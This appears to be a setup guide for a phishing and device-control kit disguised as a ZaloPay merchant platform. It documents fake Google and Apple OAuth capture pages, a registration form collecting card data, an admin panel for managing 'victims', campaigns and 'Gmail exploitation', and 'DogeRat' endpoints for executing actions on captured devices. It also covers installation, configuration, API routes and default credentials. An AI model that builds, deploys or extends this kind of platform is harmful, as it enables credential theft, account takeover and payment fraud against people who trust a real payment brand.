# ZaloPay Merchant Platform - Setup Guide

## Overview

This is a comprehensive merchant platform with:
- **Frontend Victim Interface**: HTML5/CSS3/JavaScript for OAuth capture and registration
- **Admin Control Center**: React 18.2.0 + TypeScript for managing victims, campaigns, and Gmail exploitation
- **Backend API**: Node.js + Express + Socket.IO for real-time device management and data capture
- **Database**: PostgreSQL with Prisma ORM
- **PWA Support**: Service Worker and Web App Manifest for offline functionality

## Prerequisites

- Node.js 18+ and npm
- PostgreSQL 14+
- Git

## Quick Start

### 1. Clone and Install Dependencies

```bash
# Backend
cd backend
npm install

# Admin Frontend
cd ../static/admin
npm install
```

### 2. Database Setup

#### Option A: Using Prisma Migrations (Recommended)

```bash
cd backend

# Generate Prisma Client
npm run db:generate

# Run migrations
npm run db:migrate

# Seed initial data (admin user and default campaign)
npm run db:seed
```

#### Option B: Manual SQL Setup

Nếu muốn chạy migration thủ công (không dùng Prisma CLI), hãy áp dụng file SQL đã sinh sẵn:

```bash
# Kết nối PostgreSQL
psql "$DATABASE_URL"

# Chạy migration Prisma mới nhất
\i backend/prisma/migrations/20251111_init/migration.sql
```

> Lưu ý: luôn ưu tiên `npm run db:migrate` để Prisma tự xử lý lịch sử migration. Chỉ dùng Option B khi môi trường cấm chạy CLI.

#### Option C: Docker Compose (Khuyến nghị cho local/staging)

1. Sao chép file cấu hình mẫu và chỉnh sửa thông số cần thiết:
   ```bash
   cp docker-db.env.example docker-db.env
   ```
2. (Một lần duy nhất) cấp quyền thực thi cho các script tiện ích:
   ```bash
   chmod +x scripts/db/*.sh
   ```
3. Khởi động Postgres, chạy migration + seed và health-check tự động:
   ```bash
   ./scripts/db/bootstrap.sh
   ```
   Script sẽ:
   - Khởi động stack `postgres` + `pgadmin` trong `docker-compose.db.yml`
   - Đợi dịch vụ Postgres sẵn sàng (dựa trên `pg_isready`)
   - Thực thi `npm run db:migrate`, `npm run db:seed`, `npm run db:health`
4. Giám sát log thời gian thực:
   ```bash
   ./scripts/db/tail-logs.sh
   ```
   Nhấn `Ctrl+C` để thoát.
5. Dừng stack khi không dùng nữa:
   ```bash
   docker compose --env-file docker-db.env -f docker-compose.db.yml down
   ```

Trong trường hợp cần chỉnh cổng host, cập nhật biến `DB_HOST_PORT` trong `docker-db.env` và đảm bảo `DATABASE_URL` trong `backend/.env` trỏ tới `postgresql://<user>:<pass>@localhost:<DB_HOST_PORT>/<db>`.

### 3. Environment Configuration

Create `.env` file in `backend/` directory:

```bash
cd backend
cp .env.example .env  # If .env.example exists, or create manually
```

**Required Environment Variables:**

```env
# Server
NODE_ENV=development
PORT=3000

# Database
DATABASE_URL=postgresql://postgres:postgres@localhost:5432/zalopay_merchant

# Security
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production-min-32-chars
JWT_EXPIRES_IN=24h
BCRYPT_ROUNDS=10

# Encryption Keys (AES-256-GCM)
# Generate with: openssl rand -hex 32
CARD_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-card-data
OAUTH_ENCRYPTION_KEY=your-64-character-hex-encryption-key-for-oauth-tokens

# CORS
CORS_ORIGIN=http://localhost:3000

# Google OAuth (for Gmail Exploitation)
GOOGLE_CLIENT_ID=your-google-client-id
GOOGLE_CLIENT_SECRET=your-google-client-secret
GOOGLE_REDIRECT_URI=http://localhost:3000/api/admin/gmail/callback
```

**Generate Encryption Keys:**

```bash
# Generate card encryption key
openssl rand -hex 32

# Generate OAuth encryption key
openssl rand -hex 32
```

### 4. Build Admin Frontend

```bash
cd static/admin
npm run build
```

### 5. Start Backend Server

```bash
cd backend

# Development mode (with auto-reload)
npm run dev

# Production mode
npm start
```

The server will start on `http://localhost:3000` (or your configured PORT).

## Project Structure

```
zalo-pay-2/
├── backend/
│   ├── config/              # Configuration files
│   ├── middleware/          # Express middleware
│   ├── repositories/        # Data access layer
│   ├── routes/              # API routes
│   │   ├── api/
│   │   │   ├── admin/       # Admin API routes
│   │   │   ├── capture/     # OAuth capture routes
│   │   │   ├── merchant/    # Merchant registration routes
│   │   │   └── v1/          # DogeRat API v1 routes
│   ├── services/            # Business logic
│   ├── sockets/             # Socket.IO handlers
│   ├── prisma/              # Prisma schema and migrations
│   │   ├── schema.prisma    # Database schema
│   │   └── seed.js          # Seed script
│   └── server.js            # Main server entry point
├── static/
│   ├── admin/               # Admin React frontend
│   │   ├── src/
│   │   │   ├── domains/     # Feature domains
│   │   │   ├── shared/      # Shared components and utilities
│   │   │   └── App.tsx      # Main app component
│   │   └── public/
│   │       ├── manifest.json # PWA manifest
│   │       └── sw.js         # Service Worker
│   └── merchant/            # Merchant victim interface
│       ├── index.html       # Landing page
│       ├── register.html    # Registration form
│       ├── google_auth.html # Google OAuth capture
│       └── apple_auth.html  # Apple OAuth capture
└── SETUP_GUIDE.md           # This file
```

## API Endpoints

### Merchant Endpoints

- `POST /api/capture/oauth` - Capture OAuth tokens (Google/Apple)
- `POST /api/merchant/register` - Submit registration form
- `GET /api/merchant/session/:victim_id` - Get session data
- `GET /api/merchant/banks` - Get Vietnamese banks list

### Admin Endpoints

- `POST /api/admin/auth/login` - Admin login
- `GET /api/admin/dashboard` - Dashboard statistics
- `GET /api/admin/victims` - List victims
- `GET /api/admin/campaigns` - List campaigns
- `POST /api/admin/gmail/access` - Initiate Gmail access

### DogeRat API v1

- `GET /api/v1/devices` - List all devices
- `GET /api/v1/devices/:id` - Get device details
- `POST /api/v1/devices/:id/action` - Execute action on device
- `GET /api/v1/actions` - Get available actions

## Default Credentials

After running `npm run db:seed`:

- **Username**: `admin`
- **Password**: `admin123` (or value from `ADMIN_PASSWORD` env var)
- **Email**: `admin@zalopay.local`

**⚠️ IMPORTANT**: Change the default password immediately in production!

## Development

### Running in Development Mode

```bash
# Backend (with nodemon)
cd backend
npm run dev

# Admin Frontend (with Vite HMR)
cd static/admin
npm run dev
```

### Database Migrations

```bash
cd backend

# Create new migration
npx prisma migrate dev --name migration_name

# Apply migrations
npm run db:migrate

# Reset database (⚠️ deletes all data)
npm run db:reset
```

### Testing

```bash
cd backend
npm test
```

## Production Deployment

### 1. Build Admin Frontend

```bash
cd static/admin
npm run build
```

### 2. Set Production Environment Variables

Ensure all production values are set in `.env`:
- Strong `JWT_SECRET`
- Production `DATABASE_URL`
- Encryption keys
- CORS origin
- Google OAuth credentials

### 3. Run Database Migrations

```bash
cd backend
npm run db:migrate
```

### 4. Start Server

```bash
cd backend
NODE_ENV=production npm start
```

## Troubleshooting

### Database Connection Issues

1. Verify PostgreSQL is running: `pg_isready`
2. Check `DATABASE_URL` format: `postgresql://user:password@host:port/database`
3. Ensure database exists: `createdb zalopay_merchant`

### Prisma Client Not Generated

```bash
cd backend
npm run db:generate
```

### Service Worker Not Registering

- Check browser console for errors
- Verify `sw.js` is accessible at `/admin/sw.js`
- Check that HTTPS is used in production (required for service workers)

### Socket.IO Connection Issues

- Verify CORS configuration in `backend/config/index.js`
- Check `CORS_ORIGIN` environment variable
- Ensure Socket.IO server is initialized in `server.js`

## Security Notes

1. **Encryption Keys**: Never commit encryption keys to version control
2. **JWT Secret**: Use a strong, random secret in production
3. **Database**: Use strong passwords and restrict access
4. **HTTPS**: Always use HTTPS in production
5. **CORS**: Configure CORS properly for your domain

## Additional Resources

- [Prisma Documentation](https://www.prisma.io/docs)
- [Socket.IO Documentation](https://socket.io/docs/v4)
- [React Documentation](https://react.dev)
- [PWA Documentation](https://web.dev/progressive-web-apps)

## Support

For issues and questions, refer to the project documentation or create an issue in the repository.

